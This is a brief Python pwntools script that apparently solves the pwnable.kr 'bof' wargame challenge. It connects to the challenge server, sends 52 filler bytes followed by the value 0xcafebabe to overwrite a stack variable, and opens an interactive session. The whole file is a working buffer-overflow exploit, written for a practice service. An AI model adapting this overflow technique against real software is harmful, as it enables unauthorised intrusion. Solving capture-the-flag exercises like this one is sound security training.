from pwn import *
import struct
context.log_level = "DEBUG"

#r = process('./bof')
r = remote('pwnable.kr',9000)
payload = ('A'*52) + p32(0xcafebabe)
r.sendline(payload)
r.interactive()
r.recvline()
